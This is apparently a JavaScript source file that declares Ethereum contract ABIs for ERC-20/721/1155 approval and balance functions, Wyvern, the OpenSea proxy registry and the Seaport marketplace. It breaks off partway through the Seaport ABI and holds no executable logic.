var tokenABI = [{
    "constant": false,
    "inputs": [{
        "internalType": "address",
        "name": "usr",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "wad",
        "type": "uint256"
    }],
    "name": "approve",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "internalType": "address",
        "name": "",
        "type": "address"
    }],
    "name": "balanceOf",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": true,
    "inputs": [{
        "internalType": "address",
        "name": "",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "",
        "type": "address"
    }],
    "name": "allowance",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }, {
        "internalType": "bool",
        "name": "approved",
        "type": "bool"
    }],
    "name": "setApprovalForAll",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "id",
        "type": "uint256"
    }],
    "name": "balanceOf",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "uint256",
        "name": "tokenId",
        "type": "uint256"
    }],
    "name": "ownerOf",
    "outputs": [{
        "internalType": "address",
        "name": "",
        "type": "address"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "owner",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "operator",
        "type": "address"
    }],
    "name": "isApprovedForAll",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "constant": false,
    "inputs": [{
        "internalType": "address",
        "name": "usr",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "wad",
        "type": "uint256"
    }],
    "name": "approve",
    "outputs": [{
        "internalType": "bool",
        "name": "",
        "type": "bool"
    }],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "owner",
        "type": "address"
    }],
    "name": "nonces",
    "outputs": [{
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}];
var wyvernExchangeABI = [{
    "constant": true,
    "inputs": [{
        "name": "",
        "type": "address"
    }],
    "name": "nonces",
    "outputs": [{
        "name": "",
        "type": "uint256"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}];
var openseaRegistryABI = [{
    "constant": true,
    "inputs": [{
        "name": "",
        "type": "address"
    }],
    "name": "proxies",
    "outputs": [{
        "name": "",
        "type": "address"
    }],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
}];
var seaportABI = [{
    "inputs": [{
        "internalType": "address",
        "name": "conduitController",
        "type": "address"
    }],
    "stateMutability": "nonpayable",
    "type": "constructor"
}, {
    "inputs": [],
    "name": "BadContractSignature",
    "type": "error"
}, {
    "inputs": [],
    "name": "BadFraction",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "token",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "from",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "BadReturnValueFromERC20OnTransfer",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "uint8",
        "name": "v",
        "type": "uint8"
    }],
    "name": "BadSignatureV",
    "type": "error"
}, {
    "inputs": [],
    "name": "ConsiderationCriteriaResolverOutOfRange",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "uint256",
        "name": "orderIndex",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "considerationIndex",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "shortfallAmount",
        "type": "uint256"
    }],
    "name": "ConsiderationNotMet",
    "type": "error"
}, {
    "inputs": [],
    "name": "CriteriaNotEnabledForItem",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "token",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "from",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256[]",
        "name": "identifiers",
        "type": "uint256[]"
    }, {
        "internalType": "uint256[]",
        "name": "amounts",
        "type": "uint256[]"
    }],
    "name": "ERC1155BatchTransferGenericFailure",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "EtherTransferGenericFailure",
    "type": "error"
}, {
    "inputs": [],
    "name": "InexactFraction",
    "type": "error"
}, {
    "inputs": [],
    "name": "InsufficientEtherSupplied",
    "type": "error"
}, {
    "inputs": [],
    "name": "Invalid1155BatchTransferEncoding",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidBasicOrderParameterEncoding",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "conduit",
        "type": "address"
    }],
    "name": "InvalidCallToConduit",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidCanceller",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "bytes32",
        "name": "conduitKey",
        "type": "bytes32"
    }, {
        "internalType": "address",
        "name": "conduit",
        "type": "address"
    }],
    "name": "InvalidConduit",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidERC721TransferAmount",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidFulfillmentComponentData",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "uint256",
        "name": "value",
        "type": "uint256"
    }],
    "name": "InvalidMsgValue",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidNativeOfferItem",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidProof",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }],
    "name": "InvalidRestrictedOrder",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidSignature",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidSigner",
    "type": "error"
}, {
    "inputs": [],
    "name": "InvalidTime",
    "type": "error"
}, {
    "inputs": [],
    "name": "MismatchedFulfillmentOfferAndConsiderationComponents",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "enum Side",
        "name": "side",
        "type": "uint8"
    }],
    "name": "MissingFulfillmentComponentOnAggregation",
    "type": "error"
}, {
    "inputs": [],
    "name": "MissingItemAmount",
    "type": "error"
}, {
    "inputs": [],
    "name": "MissingOriginalConsiderationItems",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "account",
        "type": "address"
    }],
    "name": "NoContract",
    "type": "error"
}, {
    "inputs": [],
    "name": "NoReentrantCalls",
    "type": "error"
}, {
    "inputs": [],
    "name": "NoSpecifiedOrdersAvailable",
    "type": "error"
}, {
    "inputs": [],
    "name": "OfferAndConsiderationRequiredOnFulfillment",
    "type": "error"
}, {
    "inputs": [],
    "name": "OfferCriteriaResolverOutOfRange",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }],
    "name": "OrderAlreadyFilled",
    "type": "error"
}, {
    "inputs": [],
    "name": "OrderCriteriaResolverOutOfRange",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }],
    "name": "OrderIsCancelled",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }],
    "name": "OrderPartiallyFilled",
    "type": "error"
}, {
    "inputs": [],
    "name": "PartialFillsNotEnabledForOrder",
    "type": "error"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "token",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "from",
        "type": "address"
    }, {
        "internalType": "address",
        "name": "to",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "identifier",
        "type": "uint256"
    }, {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
    }],
    "name": "TokenTransferGenericFailure",
    "type": "error"
}, {
    "inputs": [],
    "name": "UnresolvedConsiderationCriteria",
    "type": "error"
}, {
    "inputs": [],
    "name": "UnresolvedOfferCriteria",
    "type": "error"
}, {
    "inputs": [],
    "name": "UnusedItemParameters",
    "type": "error"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": false,
        "internalType": "uint256",
        "name": "newCounter",
        "type": "uint256"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "offerer",
        "type": "address"
    }],
    "name": "CounterIncremented",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": false,
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "offerer",
        "type": "address"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "zone",
        "type": "address"
    }],
    "name": "OrderCancelled",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": false,
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "offerer",
        "type": "address"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "zone",
        "type": "address"
    }, {
        "indexed": false,
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }, {
        "components": [{
            "internalType": "enum ItemType",
            "name": "itemType",
            "type": "uint8"
        }, {
            "internalType": "address",
            "name": "token",
            "type": "address"
        }, {
            "internalType": "uint256",
            "name": "identifier",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "amount",
            "type": "uint256"
        }],
        "indexed": false,
        "internalType": "struct SpentItem[]",
        "name": "offer",
        "type": "tuple[]"
    }, {
        "components": [{
            "internalType": "enum ItemType",
            "name": "itemType",
            "type": "uint8"
        }, {
            "internalType": "address",
            "name": "token",
            "type": "address"
        }, {
            "internalType": "uint256",
            "name": "identifier",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "amount",
            "type": "uint256"
        }, {
            "internalType": "address payable",
            "name": "recipient",
            "type": "address"
        }],
        "indexed": false,
        "internalType": "struct ReceivedItem[]",
        "name": "consideration",
        "type": "tuple[]"
    }],
    "name": "OrderFulfilled",
    "type": "event"
}, {
    "anonymous": false,
    "inputs": [{
        "indexed": false,
        "internalType": "bytes32",
        "name": "orderHash",
        "type": "bytes32"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "offerer",
        "type": "address"
    }, {
        "indexed": true,
        "internalType": "address",
        "name": "zone",
        "type": "address"
    }],
    "name": "OrderValidated",
    "type": "event"
}, {
    "inputs": [{
        "components": [{
            "internalType": "address",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "address",
            "name": "zone",
            "type": "address"
        }, {
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifierOrCriteria",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "startAmount",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endAmount",
                "type": "uint256"
            }],
            "internalType": "struct OfferItem[]",
            "name": "offer",
            "type": "tuple[]"
        }, {
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifierOrCriteria",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "startAmount",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endAmount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct ConsiderationItem[]",
            "name": "consideration",
            "type": "tuple[]"
        }, {
            "internalType": "enum OrderType",
            "name": "orderType",
            "type": "uint8"
        }, {
            "internalType": "uint256",
            "name": "startTime",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "endTime",
            "type": "uint256"
        }, {
            "internalType": "bytes32",
            "name": "zoneHash",
            "type": "bytes32"
        }, {
            "internalType": "uint256",
            "name": "salt",
            "type": "uint256"
        }, {
            "internalType": "bytes32",
            "name": "conduitKey",
            "type": "bytes32"
        }, {
            "internalType": "uint256",
            "name": "counter",
            "type": "uint256"
        }],
        "internalType": "struct OrderComponents[]",
        "name": "orders",
        "type": "tuple[]"
    }],
    "name": "cancel",
    "outputs": [{
        "internalType": "bool",
        "name": "cancelled",
        "type": "bool"
    }],
    "stateMutability": "nonpayable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "uint120",
            "name": "numerator",
            "type": "uint120"
        }, {
            "internalType": "uint120",
            "name": "denominator",
            "type": "uint120"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }, {
            "internalType": "bytes",
            "name": "extraData",
            "type": "bytes"
        }],
        "internalType": "struct AdvancedOrder",
        "name": "advancedOrder",
        "type": "tuple"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "enum Side",
            "name": "side",
            "type": "uint8"
        }, {
            "internalType": "uint256",
            "name": "index",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "identifier",
            "type": "uint256"
        }, {
            "internalType": "bytes32[]",
            "name": "criteriaProof",
            "type": "bytes32[]"
        }],
        "internalType": "struct CriteriaResolver[]",
        "name": "criteriaResolvers",
        "type": "tuple[]"
    }, {
        "internalType": "bytes32",
        "name": "fulfillerConduitKey",
        "type": "bytes32"
    }, {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }],
    "name": "fulfillAdvancedOrder",
    "outputs": [{
        "internalType": "bool",
        "name": "fulfilled",
        "type": "bool"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "uint120",
            "name": "numerator",
            "type": "uint120"
        }, {
            "internalType": "uint120",
            "name": "denominator",
            "type": "uint120"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }, {
            "internalType": "bytes",
            "name": "extraData",
            "type": "bytes"
        }],
        "internalType": "struct AdvancedOrder[]",
        "name": "advancedOrders",
        "type": "tuple[]"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "enum Side",
            "name": "side",
            "type": "uint8"
        }, {
            "internalType": "uint256",
            "name": "index",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "identifier",
            "type": "uint256"
        }, {
            "internalType": "bytes32[]",
            "name": "criteriaProof",
            "type": "bytes32[]"
        }],
        "internalType": "struct CriteriaResolver[]",
        "name": "criteriaResolvers",
        "type": "tuple[]"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "itemIndex",
            "type": "uint256"
        }],
        "internalType": "struct FulfillmentComponent[][]",
        "name": "offerFulfillments",
        "type": "tuple[][]"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "itemIndex",
            "type": "uint256"
        }],
        "internalType": "struct FulfillmentComponent[][]",
        "name": "considerationFulfillments",
        "type": "tuple[][]"
    }, {
        "internalType": "bytes32",
        "name": "fulfillerConduitKey",
        "type": "bytes32"
    }, {
        "internalType": "address",
        "name": "recipient",
        "type": "address"
    }, {
        "internalType": "uint256",
        "name": "maximumFulfilled",
        "type": "uint256"
    }],
    "name": "fulfillAvailableAdvancedOrders",
    "outputs": [{
        "internalType": "bool[]",
        "name": "availableOrders",
        "type": "bool[]"
    }, {
        "components": [{
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifier",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct ReceivedItem",
            "name": "item",
            "type": "tuple"
        }, {
            "internalType": "address",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "bytes32",
            "name": "conduitKey",
            "type": "bytes32"
        }],
        "internalType": "struct Execution[]",
        "name": "executions",
        "type": "tuple[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }],
        "internalType": "struct Order[]",
        "name": "orders",
        "type": "tuple[]"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "itemIndex",
            "type": "uint256"
        }],
        "internalType": "struct FulfillmentComponent[][]",
        "name": "offerFulfillments",
        "type": "tuple[][]"
    }, {
        "components": [{
            "internalType": "uint256",
            "name": "orderIndex",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "itemIndex",
            "type": "uint256"
        }],
        "internalType": "struct FulfillmentComponent[][]",
        "name": "considerationFulfillments",
        "type": "tuple[][]"
    }, {
        "internalType": "bytes32",
        "name": "fulfillerConduitKey",
        "type": "bytes32"
    }, {
        "internalType": "uint256",
        "name": "maximumFulfilled",
        "type": "uint256"
    }],
    "name": "fulfillAvailableOrders",
    "outputs": [{
        "internalType": "bool[]",
        "name": "availableOrders",
        "type": "bool[]"
    }, {
        "components": [{
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifier",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct ReceivedItem",
            "name": "item",
            "type": "tuple"
        }, {
            "internalType": "address",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "bytes32",
            "name": "conduitKey",
            "type": "bytes32"
        }],
        "internalType": "struct Execution[]",
        "name": "executions",
        "type": "tuple[]"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "internalType": "address",
            "name": "considerationToken",
            "type": "address"
        }, {
            "internalType": "uint256",
            "name": "considerationIdentifier",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "considerationAmount",
            "type": "uint256"
        }, {
            "internalType": "address payable",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "address",
            "name": "zone",
            "type": "address"
        }, {
            "internalType": "address",
            "name": "offerToken",
            "type": "address"
        }, {
            "internalType": "uint256",
            "name": "offerIdentifier",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "offerAmount",
            "type": "uint256"
        }, {
            "internalType": "enum BasicOrderType",
            "name": "basicOrderType",
            "type": "uint8"
        }, {
            "internalType": "uint256",
            "name": "startTime",
            "type": "uint256"
        }, {
            "internalType": "uint256",
            "name": "endTime",
            "type": "uint256"
        }, {
            "internalType": "bytes32",
            "name": "zoneHash",
            "type": "bytes32"
        }, {
            "internalType": "uint256",
            "name": "salt",
            "type": "uint256"
        }, {
            "internalType": "bytes32",
            "name": "offererConduitKey",
            "type": "bytes32"
        }, {
            "internalType": "bytes32",
            "name": "fulfillerConduitKey",
            "type": "bytes32"
        }, {
            "internalType": "uint256",
            "name": "totalOriginalAdditionalRecipients",
            "type": "uint256"
        }, {
            "components": [{
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct AdditionalRecipient[]",
            "name": "additionalRecipients",
            "type": "tuple[]"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }],
        "internalType": "struct BasicOrderParameters",
        "name": "parameters",
        "type": "tuple"
    }],
    "name": "fulfillBasicOrder",
    "outputs": [{
        "internalType": "bool",
        "name": "fulfilled",
        "type": "bool"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "components": [{
                "internalType": "address",
                "name": "offerer",
                "type": "address"
            }, {
                "internalType": "address",
                "name": "zone",
                "type": "address"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }],
                "internalType": "struct OfferItem[]",
                "name": "offer",
                "type": "tuple[]"
            }, {
                "components": [{
                    "internalType": "enum ItemType",
                    "name": "itemType",
                    "type": "uint8"
                }, {
                    "internalType": "address",
                    "name": "token",
                    "type": "address"
                }, {
                    "internalType": "uint256",
                    "name": "identifierOrCriteria",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "startAmount",
                    "type": "uint256"
                }, {
                    "internalType": "uint256",
                    "name": "endAmount",
                    "type": "uint256"
                }, {
                    "internalType": "address payable",
                    "name": "recipient",
                    "type": "address"
                }],
                "internalType": "struct ConsiderationItem[]",
                "name": "consideration",
                "type": "tuple[]"
            }, {
                "internalType": "enum OrderType",
                "name": "orderType",
                "type": "uint8"
            }, {
                "internalType": "uint256",
                "name": "startTime",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endTime",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "zoneHash",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "salt",
                "type": "uint256"
            }, {
                "internalType": "bytes32",
                "name": "conduitKey",
                "type": "bytes32"
            }, {
                "internalType": "uint256",
                "name": "totalOriginalConsiderationItems",
                "type": "uint256"
            }],
            "internalType": "struct OrderParameters",
            "name": "parameters",
            "type": "tuple"
        }, {
            "internalType": "bytes",
            "name": "signature",
            "type": "bytes"
        }],
        "internalType": "struct Order",
        "name": "order",
        "type": "tuple"
    }, {
        "internalType": "bytes32",
        "name": "fulfillerConduitKey",
        "type": "bytes32"
    }],
    "name": "fulfillOrder",
    "outputs": [{
        "internalType": "bool",
        "name": "fulfilled",
        "type": "bool"
    }],
    "stateMutability": "payable",
    "type": "function"
}, {
    "inputs": [{
        "internalType": "address",
        "name": "offerer",
        "type": "address"
    }],
    "name": "getCounter",
    "outputs": [{
        "internalType": "uint256",
        "name": "counter",
        "type": "uint256"
    }],
    "stateMutability": "view",
    "type": "function"
}, {
    "inputs": [{
        "components": [{
            "internalType": "address",
            "name": "offerer",
            "type": "address"
        }, {
            "internalType": "address",
            "name": "zone",
            "type": "address"
        }, {
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifierOrCriteria",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "startAmount",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endAmount",
                "type": "uint256"
            }],
            "internalType": "struct OfferItem[]",
            "name": "offer",
            "type": "tuple[]"
        }, {
            "components": [{
                "internalType": "enum ItemType",
                "name": "itemType",
                "type": "uint8"
            }, {
                "internalType": "address",
                "name": "token",
                "type": "address"
            }, {
                "internalType": "uint256",
                "name": "identifierOrCriteria",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "startAmount",
                "type": "uint256"
            }, {
                "internalType": "uint256",
                "name": "endAmount",
                "type": "uint256"
            }, {
                "internalType": "address payable",
                "name": "recipient",
                "type": "address"
            }],
            "internalType": "struct ConsiderationItem[]",
